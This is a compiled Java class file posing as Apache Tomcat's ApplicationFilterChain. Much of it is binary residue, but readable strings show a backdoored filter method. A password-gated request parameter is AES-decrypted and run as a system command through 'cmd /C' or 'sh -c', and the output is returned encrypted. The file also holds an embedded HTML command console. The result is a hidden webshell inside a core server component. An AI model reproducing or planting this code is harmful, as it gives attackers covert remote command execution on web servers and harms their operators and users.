����   4S
 ~#$	 �%	 �&	 �'	 �(	 �)	 x*  0
123
 4567
 =8
 9
 �: � �;<=
>?
 ;@
>AB
>C
 D
 EF	GH
 ;IJK
LM
 ;NO
 ;PQR	GS	GT
 ;U
 ;V
 ;WXY
 .Z[
 1\]
 5^_
 5`a
 7#
 7b
 5cd
 ;Ze
 =fg
 ?#
hi �j
hklmno
pq
rs
 Ht
 Gu
 Gv
 ?wx
 Gy
 f
 5z
 ?{
 ;|
L}~
 V#
 V�
 ;��� �� ��
���������������������
 � ���
 �
����	�� ��� |�� �	 ��
�����
��
��	 ���
��	��	 ��
 ��	 ����	 ��
�����
 �����
 ����
 �#
���� lastServicedRequest Ljava/lang/ThreadLocal; 	Signature 7Ljava/lang/ThreadLocal<Ljavax/servlet/ServletRequest;>; lastServicedResponse 8Ljava/lang/ThreadLocal<Ljavax/servlet/ServletResponse;>; 	INCREMENT I ConstantValue   
 filters 3[Lorg/apache/catalina/core/ApplicationFilterConfig; pos n servlet Ljavax/servlet/Servlet; servletSupportsAsync Z sm *Lorg/apache/tomcat/util/res/StringManager; 	classType [Ljava/lang/Class; [Ljava/lang/Class<*>; classTypeUsedInService <init> ()V Code LineNumberTable LocalVariableTable this 1Lorg/apache/catalina/core/ApplicationFilterChain; doFilter @(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V e Ljava/lang/Exception; pe )Ljava/security/PrivilegedActionException; req Ljavax/servlet/ServletRequest; res Ljavax/servlet/ServletResponse; request response StackMapTable���3e 
Exceptions internalDoFilter md Ljava/security/MessageDigest; keyspec !Ljavax/crypto/spec/SecretKeySpec; ivspec #Ljavax/crypto/spec/IvParameterSpec; cipher Ljavax/crypto/Cipher; original [B p Ljava/lang/Process; br Ljava/io/BufferedReader; line Ljava/lang/String; Ljava/io/IOException; 	blockSize 	dataBytes plaintextLength 	plaintext 	encrypted result Ljava/lang/StringBuilder; resValue charSet osName cmd 
secret_key cryptoJs jsHtml html passwordMd5 	principal Ljava/security/Principal; args [Ljava/lang/Object; filter Ljavax/servlet/Filter; Ljava/lang/Throwable; filterConfig 2Lorg/apache/catalina/core/ApplicationFilterConfig; passworddFg�n6X[_ �$�� getLastServicedRequest  ()Ljavax/servlet/ServletRequest; getLastServicedResponse !()Ljavax/servlet/ServletResponse; 	addFilter 5(Lorg/apache/catalina/core/ApplicationFilterConfig;)V 
newFilters � release i reuse 
setServlet (Ljavax/servlet/Servlet;)V setServletSupportsAsync (Z)V findNonAsyncFilters (Ljava/util/Set;)V Ljava/util/Set; LocalVariableTypeTable #Ljava/util/Set<Ljava/lang/String;>; &(Ljava/util/Set<Ljava/lang/String;>;)V lambda$doFilter$0 O(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)Ljava/lang/Void; <clinit> 
SourceFile ApplicationFilterChain.java � � 0org/apache/catalina/core/ApplicationFilterConfig � � � � � � � � � �� � BootstrapMethods��������� 'java/security/PrivilegedActionException�� javax/servlet/ServletException java/io/IOException java/lang/RuntimeException�� �� � ���   MD5������� java/math/BigInteger�� ���� &java/security/NoSuchAlgorithmException�� ��� UTF-8 os.name����� windows�� GBK c� �� ������� javax/crypto/spec/SecretKeySpec AES �� !javax/crypto/spec/IvParameterSpec �� AES/CBC/NoPadding�� javax/crypto/Cipher�� sun/misc/BASE64Decoder�  java/lang/String java/lang/Exception � java/lang/StringBuilder /C sh -c java/io/BufferedReader java/io/InputStreamReader�	
 � �� 
 �����  sun/misc/BASE64Encoder 
  text/plain;charset=UTF-8  <script> var SECRET_KEY = "
�";
function toUTF8Array(str) {
    var utf8 = [];
    for (var i=0; i < str.length; i++) {
        var charcode = str.charCodeAt(i);
        if (charcode < 0x80) utf8.push(charcode);
        else if (charcode < 0x800) {
            utf8.push(0xc0 | (charcode >> 6),
                0x80 | (charcode & 0x3f));
        }
        else if (charcode < 0xd800 || charcode >= 0xe000) {
            utf8.push(0xe0 | (charcode >> 12),
                0x80 | ((charcode>>6) & 0x3f),
                0x80 | (charcode & 0x3f));
        }
        else {
            i++;
            charcode = 0x10000 + (((charcode & 0x3ff)<<10)
                | (str.charCodeAt(i) & 0x3ff));
            utf8.push(0xf0 | (charcode >>18),
                0x80 | ((charcode>>12) & 0x3f),
                0x80 | ((charcode>>6) & 0x3f),
                0x80 | (charcode & 0x3f));
        }
    }
    return utf8;
}
function Utf8ArrayToStr(array) {
    var out, i, len, c;
    var char2, char3;
    out = "";
    len = array.length;
    i = 0;
    while(i < len) {
        c = array[i++];
        switch(c >> 4) {
            case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7:
                out += String.fromCharCode(c);
                break;
            case 12: case 13:
                char2 = array[i++];
                out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
                break;
            case 14:
                char2 = array[i++];
                char3 = array[i++];
                out += String.fromCharCode(((c & 0x0F) << 12) |
                    ((char2 & 0x3F) << 6) |
                    ((char3 & 0x3F) << 0));
                break;
        }
    }
    return out;
}

function encrypt(text) {
    var tArr = toUTF8Array(text);
    var plaintextLength = tArr.length;
    var plaintextLength2;
    if (plaintextLength % 16 !== 0) {
        plaintextLength2 = plaintextLength + (16 - (plaintextLength % 16));
    }
    var i = 0;
    while(true) {
        if(i < (plaintextLength2 - plaintextLength)){
            tArr.push(0);
        } else {
            break;
        }
        i++;
    }
    text = Utf8ArrayToStr(tArr);
    return CryptoJS.AES.encrypt(text, CryptoJS.enc.Utf8.parse(SECRET_KEY), {
            iv: CryptoJS.enc.Utf8.parse(SECRET_KEY),
            mode: CryptoJS.mode.CBC,
            padding: CryptoJS.pad.NoPadding
        }).toString();
}

function decrypt(text) {
    return CryptoJS.AES.decrypt(text, CryptoJS.enc.Utf8.parse(SECRET_KEY), {
            iv: CryptoJS.enc.Utf8.parse(SECRET_KEY),
            mode: CryptoJS.mode.CBC,
            padding: CryptoJS.pad.NoPadding
        }).toString(CryptoJS.enc.Utf8).replace(/^\s*|\s*$/g,"");
}
 
</script>
 	<script>
 function encrypt(text) {
 <    return window.btoa(unescape(encodeURIComponent(text)));
 }
 function decrypt(text) {
 :    return decodeURIComponent(escape(window.atob(text)));
 R<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 Y</head>
<body style="overflow-y: hidden;">
<div style="text-align: left;height: 1200px;"> 9<form id="frm" method="post" onsubmit="return Submit()">
 i$&gt;<input id="c" name="c" style="width: 400px;">&nbsp;<input type="submit" value="执行">
</form><br>
 I<textarea id="txt" style="width: 700px;height:600px;"></textarea>
</div>
{<script>
function send(data) { var xhr = new XMLHttpRequest();xhr.open("POST", window.location.href);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");xhr.send(data);xhr.onreadystatechange = function() {if (xhr.readyState === 4 && xhr.status === 200) { var resTxt = xhr.response;resTxt = decrypt(resTxt);
document.getElementById('txt').value = resTxt;}};}
 rfunction Submit(){ var v = document.getElementById('c').value; v = encodeURIComponent(encrypt(v)); send('password= Q&c=' + v); return false; }
window.scrollTo({ top:0 });
</script>
</body>
</html>
 text/html;charset=UTF-8!"#$ false%&'(� org/apache/catalina/Globals #org.apache.catalina.ASYNC_SUPPORTED)*+,- %javax/servlet/http/HttpServletRequest./ java/lang/Object � �012� �3 java/lang/Throwable45678 � � filterChain.filter9:�;< � � �=> � � &javax/servlet/http/HttpServletResponse service � �1?@� � filterChain.servletA� javax/servlet/ServletRequest javax/servlet/ServletResponse /org/apache/catalina/core/ApplicationFilterChainB�CD� java/lang/ThreadLocalEF java/lang/Class javax/servlet/FilterChain java/lang/Process javax/servlet/Filter IS_SECURITY_ENABLED
GH ()Ljava/lang/Object;
 �I ()Ljava/lang/Void; run �(Lorg/apache/catalina/core/ApplicationFilterChain;Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)Ljava/security/PrivilegedExceptionAction; java/security/AccessController doPrivileged =(Ljava/security/PrivilegedExceptionAction;)Ljava/lang/Object; getException ()Ljava/lang/Exception; 
getMessage ()Ljava/lang/String; *(Ljava/lang/String;Ljava/lang/Throwable;)V getParameter &(Ljava/lang/String;)Ljava/lang/String; java/security/MessageDigest getInstance 1(Ljava/lang/String;)Ljava/security/MessageDigest; getBytes ()[B update ([B)V digest (I[B)V toString (I)Ljava/lang/String; com/jun/apt/AgentEntry PASSWORD equalsIgnoreCase (Ljava/lang/String;)Z java/lang/System getProperty toLowerCase contains (Ljava/lang/CharSequence;)Z 
SECRET_KEY 	CRYPTO_JS trim equals (Ljava/lang/Object;)Z length ()I ([BLjava/lang/String;)V )(Ljava/lang/String;)Ljavax/crypto/Cipher; init B(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V decodeBuffer (Ljava/lang/String;)[B doFinal ([B)[B printStackTrace java/lang/Runtime 
getRuntime ()Ljava/lang/Runtime; exec (([Ljava/lang/String;)Ljava/lang/Process; getInputStream ()Ljava/io/InputStream; java/nio/charset/Charset forName .(Ljava/lang/String;)Ljava/nio/charset/Charset; 2(Ljava/io/InputStream;Ljava/nio/charset/Charset;)V (Ljava/io/Reader;)V readLine append -(Ljava/lang/String;)Ljava/lang/StringBuilder; close getBlockSize 	arraycopy *(Ljava/lang/Object;ILjava/lang/Object;II)V encodeBuffer ([B)Ljava/lang/String; replace D(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String; setContentType (Ljava/lang/String;)V 	getWriter ()Ljava/io/PrintWriter; java/io/PrintWriter write 	getFilter ()Ljavax/servlet/Filter; isAsyncSupported ()Z getFilterDef 3()Lorg/apache/tomcat/util/descriptor/web/FilterDef; /org/apache/tomcat/util/descriptor/web/FilterDef getAsyncSupported java/lang/Boolean FALSE Ljava/lang/Boolean; setAttribute '(Ljava/lang/String;Ljava/lang/Object;)V getUserPrincipal ()Ljava/security/Principal; )org/apache/catalina/security/SecurityUtil doAsPrivilege i(Ljava/lang/String;Ljavax/servlet/Filter;[Ljava/lang/Class;[Ljava/lang/Object;Ljava/security/Principal;)V [(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;Ljavax/servlet/FilterChain;)V %org/apache/tomcat/util/ExceptionUtils unwrapInvocationTargetException ,(Ljava/lang/Throwable;)Ljava/lang/Throwable; handleThrowable (Ljava/lang/Throwable;)V (org/apache/tomcat/util/res/StringManager 	getString .org/apache/catalina/core/ApplicationDispatcher WRAP_SAME_OBJECT set (Ljava/lang/Object;)V j(Ljava/lang/String;Ljavax/servlet/Servlet;[Ljava/lang/Class;[Ljava/lang/Object;Ljava/security/Principal;)V javax/servlet/Servlet get getFilterClass java/util/Set add 
getManager =(Ljava/lang/Class;)Lorg/apache/tomcat/util/res/StringManager;JKO "java/lang/invoke/LambdaMetafactory metafactoryQ Lookup InnerClasses �(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodHandle;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;R %java/lang/invoke/MethodHandles$Lookup java/lang/invoke/MethodHandles 1 � ~  �   � �  �    �  � �  �    �  � �  �    �  � �    � �    � �    � �    � �    � �    � �  �    �  � �  �    �   � �  �   _     !*� *� � *� *� *� *� �    �       7  R  Y  _  e  k �       ! � �    � �  �  S     g� � ]+N,:*-� 	  � 
W� E:� :� � 	� �� � 	� �� � 	� �� Y� � �� 	*+,� �       �   F    �  �  �  �  �  �  � $ � , � 2 � : � @ � H � N � ] � ` � f � �   H  $ 9 � �   @ � �   U � �   R � �    g � �     g � �    g � �  �   8 �   � � � � �  ��  � ��   � � �   �        � �  �  �    �+�  N-��:� :-� � � Y� � � :� :� �  ��!:"� #� $:%� &� ':+(�  :� ):	� *:
:	�	� +Y:	� ,���� -��� .Y	� /� 0:� 1Y	� � 2:3� 4:� 6� 7Y� 8� 9� ::� ;Y!� <� +:� 
:� >� ?Y� @:%� &� !� A� ;YBSYCSYS� D:� � A� ;YESYFSYS� D:� GY� HY� I� J� K� L:� MY:� � NO� NW���� P� 
:� Q:� .Y	� /� 0:� 1Y	� � 2:3� 4:� R6� S!� T:�6p� pd`6�:�� U� 6� ::� VY� W� X:Y� Z[� Z:� 
:� >,\� ] ,� ^ � _�� ?Y� @� N`� N
� NY� N� S:� ?Y� @� Na� N	� Nb� N� S:� ?Y� @� Nc� N� S:��� �� -� � ;Y� 7Y� 8� 9!� <:� ?Y� @:%� &� !� A� ;YBSYCSYS� D:� � A� ;YESYFSYS� D:� GY� HY� I� J� K� L:� MY:� � NO� NW���� P� 
:� Q� VY� W� S!� T� X:Y� Z[� Z:,\� ] ,� ^ � _�� ?Y� @� Nd� N� S:� ?Y� @� Ne� N� S:� ?Y� @� Nf� N� S:� ?Y� @� Ng� N� S:� ?Y� @� Nh� N� S:� ?Y� @� Ni� N� S:� ?Y� @� Ng� N� S:� ?Y� @� Nc� N� S::� ?Y� @� Nj� N� S:� ?Y� @� N� N� S:� ?Y� @� Nk� N� S:� ?Y� @� Nl� N� S:� ?Y� @� Nm� N� S:� ?Y� @� Nn� N� S:� ?Y� @� No� N� S:� ?Y� @� Np� N-� Nq� N� S:,r� ] ,� ^ � _*� *� � �*� *Y� Z`� 2:� s:+� t � u� v� w�  � +y� z� { � � :+:,:� |� } :� ~YSYSY*S:	� �	� �� +,*� � � (:�:� �:� �� Y� ��� �� ��� �� � �+� �� �,� �+� t � *� � +y� z� { +� |� E,� �� >� � 8+:,:� |� } :� ~YSYS:�*� � �� �� *� +,� � � �� R� �� �� �� �� A:�:� �:� �� Y� ��� �� �:� �� � �� �� �� ���   5 8  � � � = }� �"% =�CF &�� &�� &�� &�� ��D[ �D[ �D[ �D` ��D�  [��    �  j �   � 	 �  �  �  � ! � 5 � 8 � : � E � I � S � ] � a � k � p � u � y � � � � � � � � � � � � � � � � � � � � � � �  �
 �( �C �M �] �h �x �} �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� � � �" �% �' �, �4 ?@`�[�_�`�c�f�g�i	jk#m.n>pCsFqHrMvcwuy}z�{�~����������#�9�=�S�i��������������	��&�-�:�@�F�Q�W�Z�]�b�i�}�����������������������������������
���&�6�9�D�J�Q�[�]�`�b�i�n����������� �  ( 7    � �  � B � �  � 4 � �  � - � �  �  � �  �  � � %  � � ]   � � e  � � C = � � �  � � � � � � � y � � � r � � � k � � � _ � � � Z � � � ? � �    � � '  � �  @ � � � � � � �  � � #   � � +  � � 	 = � � H  � � � � � � c & � �  I� � �  S� � �  k� � �  p� � � 	 u� � � 
 y� � � = � � �  � � � Z 1 � � ] . � � i " � � }  � � 	- k � � �  � � �  � � & � � �  / � � 
 , � �    � � &  � � ]  � � b  � �   � � �    � � �   � � �  	� � �  �  � )� 8  � � � �  �  �� & � �� �  � � � �  � � � � � � �  �� 0 ��  ��  �  ��   � � � �  � � � � � � � � � U  � � � �  � � � � � � � �  �  � G  � � � �  � � � � � � � �  �  �� � X� T ��  ��  �  ��   � � � �  � � � � � � � � � ;� �� �  � � � �  � G<� 	B �D�  � H
V �D_�   � � � �                     �   � � � �   �       		
  �   "      
� �� �� ��    �      � 	  �   "      
� �� �� ��    �           �   �     `*� M,�>6� ,2:+� �����*� *� �� !*� 
`� M*� ,*� � U*,� *� *Y� Z`� +S�    �   * 
      $ 0 ; I N _ �   *    � �  ;  �    ` � �     ` � �  �    � � )   �  �   �     ,<*� � *� S����*� *� *� *� �    �   "   # 
$ # & ' !( &) +* �       �    , � �   �   	 � �    �  �   4     *� �    �   
   1 2 �        � �      �   >     *+� �    �   
   ; < �        � �      � �     �   >     *� �    �   
   @ A �        � �      � �    �   �     2=*� � **� 2Nu-� v� w�  � +-� �� � W���Ա    �      M 
N O  P +M 1S �   *    � �   / �    2 � �     2 �        2 �  �   
 � (�  �     �   J     *+,� �    �   
    �  � �         � �      � �     � �  �     =   �  �   �      U� �� � �Y� �� �� �Y� �� �� � �� ��� �� �� �Y�SY�SY�S� �� �Y�SY�S� ��    �   "    >  ?  @  B ! C % p - w C ~ �     !   "N   
 LPM +    , -./